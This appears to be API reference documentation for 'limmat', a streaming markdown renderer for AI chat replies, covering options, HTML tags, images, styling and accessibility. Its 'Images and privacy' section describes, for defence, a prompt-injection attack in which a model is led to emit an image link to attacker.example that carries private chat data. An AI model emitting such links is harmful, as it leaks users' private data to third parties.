# API reference

The quick start is in the [README](../README.md). Types and defaults are also in the TSDoc that editors show.

## Options

| Option | Default | |
|---|---|---|
| `onLinkClick(href, event)` | none | Return `true` if you handled the click. limmat then calls `preventDefault()`. If it throws, the error reaches `window.onerror` and the link behaves normally. |
| `isInternalPath(path)` | all paths | Site-relative paths (`/research/x/`) become links only if this returns `true`. Others render as plain text. It gets the raw path including any query and hash, may be called more than once per link while the reply streams, and a throw counts as `false`. Check the whole path, not just a prefix: `/research/../admin` starts with `/research/`. |
| `allowedProtocols` | `['https', 'http', 'mailto']` | Protocols that may become links, with or without the colon and in any case. Anything else renders as plain text. |
| `externalLinksNewTab` | `true` | `http` and `https` links get `target="_blank"` and `rel="noopener noreferrer"`. `false` adds neither, so they open in the same tab (site paths and `mailto:` links never get them). For per-link control, return `true` from `onLinkClick` and open the link yourself. |
| `html` | `true` | Attribute-free `b`, `strong`, `i`, `em`, `u`, `s`, `del`, `ins`, `mark`, `small`, `kbd`, `sub`, and `sup` tags become elements, and markdown works inside them. `false` shows them as text, and an array of names narrows the list (names outside the built-in list are ignored, so the option can never create another element). A tag with any attribute and every other tag stays text, and `<br>` always works. The name `details` in an array also turns on [collapsible sections](#collapsible-sections). See [HTML tags](#html-tags). |
| `images` | `true` | `![alt](url)` becomes an `<img>` when the URL passes the link checks, limited to `http`, `https`, and site paths. An array of origins (`['https://cdn.example.com']`) loads only from those, and site paths still work. `false` shows the alt text only. `allowedProtocols` and `isInternalPath` apply too. See [Images and privacy](#images-and-privacy). |
| `highlight(el, code, lang)` | none | Called once when a fence closes (or at `end()`), with the `<code>` element. A throw or rejection is ignored and the plain text stays. |
| `throttleMs` | `50` | Minimum time between re-renders of the open block. `0` renders on every write. A non-finite value uses the default. |
| `classPrefix` | `'limmat'` | Prefix of every generated class. The bundled `style.css` only styles the default prefix. |
| `labels` | English | `copy` (`Copy`), `copied` (`Copied`), `table` (`Table`), `done` (`Completed`), `todo` (`Not completed`). |

## Methods

- `write(chunk)`: add text. The first write renders at once, later writes at most once per `throttleMs`. Ignored after `end()` until `reset()`, and after `destroy()`.
- `end()`: render the final state synchronously: unfinished constructs become literal text and code is highlighted. Calling it twice is safe.
- `reset()`: empty the container and start a new message, keeping the options.
- `destroy()`: remove the click listener and stop timers. The rendered DOM stays, and a render still waiting on the throttle is dropped (call `end()` first to keep it). Every later call is a no-op.

`createRenderer` throws a `TypeError` if the container is not an element. Importing limmat is safe on the server, but rendering needs a DOM (for SSR use jsdom or happy-dom).

## HTML tags

Models often mix HTML into markdown, so these tags work when written without attributes: `b`, `strong`, `i`, `em`, `u`, `s`, `del`, `ins`, `mark`, `small`, `kbd`, `sub`, `sup`, plus `<br>`. For example `Press <kbd>Ctrl</kbd>+<kbd>C</kbd> to copy H<sub>2</sub>O` renders the keys and the subscript.

Everything else stays visible text: a tag with any attribute (`<kbd class="x">`), unknown tags (`<div>`, `<span>`, `<thinking>`), and tags that load or run something (`<a>`, `<img>`, `<script>`, `<iframe>`). Tags must nest properly: in `<b><i>x</b></i>` the `<i>` and `</i>` stay text, and a closing tag with no opener stays text. While a reply streams, a half-typed tag such as `<kb` is hidden, and a tag that is still open is closed for display. If it never closes, it shows as text when the message ends. Tags inside inline code and fences are code text. Block-level `<details>` and `<summary>` are covered in [Collapsible sections](#collapsible-sections). Narrow or disable the list with `html: ['kbd', 'sub']` or `html: false`.

### Collapsible sections

```
<details>
<summary>Why this works</summary>

Content with **markdown**, lists, code, and nested sections.

</details>
```

renders a native `<details>` and `<summary>`, which are keyboard and screen-reader accessible. Each tag sits alone on its line, and `<details><summary>Title</summary>` on one line works too. The summary is one line of inline markdown, and the optional line must come right after the opener. The only attribute is `open` (`<details open>`), and anything else (`<details class="x">`, `<summary onclick=...>`) stays text. An unmatched `</details>` stays text.

While a reply streams, a block that has not closed yet shows as a collapsed `<details>` with what has arrived, and a half-typed tag line is hidden. If it never closes (the model forgot `</details>`, or the reply was cut off), it opens when the message ends, so nothing stays hidden behind a click, in the same way an unclosed code fence still renders as code. A lone `<details>` with nothing after it stays text.

Because the opener swallows everything up to its closer, a stray `<details>` line wraps the rest of the reply in a section. Content stays in the page and in the accessibility tree, but a closed section hides text from a reader until they open it, so do not rely on it to show anything important. Sections nest up to 12 levels. The reader's open or closed choice survives while the reply streams, and code inside a section is highlighted once the section is settled.

## Images and privacy

Images are on by default, so a reply with `![chart](https://example.com/chart.png)` shows the chart. Every `<img>` gets `loading="lazy"`, `decoding="async"`, and `referrerpolicy="no-referrer"`, so your page address is not sent along.

An image loads the moment it renders, with no click. A model that reads attacker-controlled text (a web page, an email, a document) can be told to emit `![](https://attacker.example/?q=<something private from the chat>)`, and the browser then sends that to the attacker's server. limmat cannot tell a harmless image from that one. If your replies can contain private data and untrusted input together, narrow it down:

```ts
createRenderer(el, { images: ['https://cdn.example.com'] }); // only from your own host
createRenderer(el, { images: false });                       // alt text only
```

A Content-Security-Policy `img-src` directive (for example `img-src 'self' https://cdn.example.com`) does the same job for the whole page, and also covers anything else on it. Use both if you can.

Images reuse the link checks: `javascript:`, `data:`, `blob:`, and `file:` sources, `//host`, backslashes, and invisible or look-alike characters never become an `<img>`, and `allowedProtocols` can only narrow images to `https` or `http`, never widen them. A relative source needs a leading slash (`/img/a.png`), like a link. Reference-style images (`![alt][ref]`) are not supported yet. The alt text shown is the plain text of the label, and the image is not wrapped in a link. While a reply streams, the image appears when its closing `)` arrives, and the alt text shows before that.

## Code highlighting

```ts
import { speedHighlight } from 'limmat/highlight';
import '@speed-highlight/core/themes/default.css'; // pick any theme, the highlighter only adds classes
createRenderer(el, { highlight: speedHighlight() });
```

This adapter uses [`@speed-highlight/core`](https://github.com/speed-highlight/core), an optional peer dependency you install yourself. Each language loads as its own small chunk the first time it is needed, so a reply without code downloads nothing extra. Without a theme stylesheet the code stays uncolored. Choose a theme that matches your page (light or dark), because it sets the token colors. With `limmat/style.css` loaded, limmat keeps its own frame and the theme only supplies colors. Code over 4 KB or with lines over 300 characters is left as plain text (the highlighter is slow on those); tune it with `speedHighlight({ maxChars, maxLine })`.

## Styling

`limmat/style.css` is optional. It uses CSS variables (`--limmat-link`, `--limmat-border`, `--limmat-code-bg`, `--limmat-radius`, `--limmat-font-mono`, `--limmat-muted`, `--limmat-focus`), follows `prefers-color-scheme`, and supports forced colors. The generated structure is:

```
p, h1-h6, hr, blockquote, ul.limmat-list, ol.limmat-list, li, li.limmat-task (task items)
div.limmat-code
  div.limmat-code-head > span.limmat-lang[aria-hidden], button.limmat-copy, span.limmat-status[role=status]
  pre[tabindex=0] > code.limmat-lang-ts
div.limmat-table-wrap[tabindex=0][role=region] > table
a.limmat-link
details.limmat-details[open] > summary.limmat-summary, then the content blocks
kbd.limmat-kbd, b, strong, i, em, u, s, del, ins, mark, small, sub, sup (from the HTML tags, no attributes)
img.limmat-image[loading=lazy][decoding=async][referrerpolicy=no-referrer] (an image)
code.limmat-inline-code (inline code)
```

## Frameworks

Give limmat an empty element and call `destroy()` when it goes away. React:

```tsx
function Answer({ stream }: { stream: AsyncIterable<string> }) {
  const ref = useRef<HTMLDivElement>(null);
  useEffect(() => {
    const md = createRenderer(ref.current!);
    let live = true;
    (async () => {
      for await (const chunk of stream) if (live) md.write(chunk);
      if (live) md.end();
    })();
    return () => {
      live = false;
      md.destroy();
    };
  }, [stream]);
  return <div ref={ref} />;
}
```

Svelte, as an action:

```svelte
<script>
  import { createRenderer } from 'limmat';
  export let stream;
  function render(node, stream) {
    const md = createRenderer(node);
    (async () => {
      for await (const chunk of stream) md.write(chunk);
      md.end();
    })();
    return { destroy: () => md.destroy() };
  }
</script>

<div use:render={stream}></div>
```

## Accessibility

The message container has no live region, because announcing every chunk is noisy. To have the finished reply announced, set `aria-busy` on your own element while streaming, or announce once after `end()`.

What limmat labels for you:

- The Copy button says the language (`Copy ts`, or `Copy code` when there is none), and the language label is hidden from screen readers.
- Tables and code blocks are keyboard-scrollable, and task checkboxes have names.
- The copy result is announced through a polite status element.
- The Copy button is available while a fence is still open and copies what has arrived so far.

## Stability

From v0.1, a change to any of these is a breaking change:

- `createRenderer` and the four `Renderer` methods.
- The option names and their meanings.
- The `limmat-*` class names listed under Styling (classes may be added, never removed or renamed), the CSS variable names, and the ARIA attributes.

These may change in a minor release:

- The exact set of recognized syntax (see [What is supported](../README.md#what-is-supported)).
- The DOM inside a code block, the `labels` keys, and what a half-finished construct looks like mid-stream.

While the version is 0.x, minor releases may also break the stable parts, and the [changelog](../CHANGELOG.md) will say so. Math, `[1]` citations, emoji codes, alerts, and footnotes will only become markup behind an opt-in option. Standard CommonMark syntax that is missing today (such as setext headings, reference links, and entities) may be added in any release.

## Browser support

The browser suite runs on current Chromium, Firefox, and WebKit. From the APIs used (`replaceChildren`, `matchAll`, `?.`, `??`, Unicode property escapes, sticky regexes) the minimum should be Chrome 86, Firefox 78, and Safari 14. These floors come from compatibility data, not from tests on old browsers. The optional CSS uses `color-mix()` as an upgrade with plain fallbacks. It also uses `:where()` (Chrome 88), `:focus-visible` (Firefox 85, Safari 15.4), and flex `gap` (Safari 14.1): older browsers show their default focus outline and tighter spacing in the code header, and everything still works.

## Content-Security-Policy

limmat works under a strict policy such as `default-src 'none'; script-src 'self'; style-src 'self'`. It never uses inline scripts, `eval`, or a `style` attribute written as a string. Table alignment and the Copy fallback use the CSSOM, which `style-src` does not block. A test guards this.

## Known limits

- `throttleMs: 0` re-renders the open block on every write, so one very long paragraph is quadratic in that mode. The default throttle bounds it.
- `[1]` shows as "1" while its closing bracket is in flight, then as "[1]" once it is clear that no link follows.
- `~~x~` stays literal, and `#anchor` links and relative links without a leading slash render as plain text.
- Loose lists render tight, and a list marker change inside one list does not start a new list unless it switches between bullets and numbers.
